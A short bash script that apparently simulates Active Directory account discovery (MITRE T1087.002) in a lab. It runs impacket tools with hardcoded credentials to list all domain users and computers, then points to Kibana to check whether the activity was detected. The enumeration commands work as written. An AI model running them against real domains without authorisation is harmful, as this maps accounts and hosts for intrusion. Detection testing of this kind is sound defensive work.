#!/bin/bash
# Attack Simulation: Account Discovery
# MITRE ATT&CK: T1087.002
# Usage: ./account_discovery.sh
# Requirements: impacket installed on Kali

DC_IP="192.168.50.86"
DOMAIN="lab.local"
USERNAME="jsmith"
PASSWORD="Password123!"

echo "[*] Enumerating AD users from $DC_IP"
impacket-GetADUsers "${DOMAIN}/${USERNAME}:${PASSWORD}" -dc-ip $DC_IP -all

echo "[*] Enumerating AD computers..."
impacket-GetADComputers "${DOMAIN}/${USERNAME}:${PASSWORD}" -dc-ip $DC_IP -all

echo "[*] Attack complete - check Kibana for LDAP connection events on port 389"
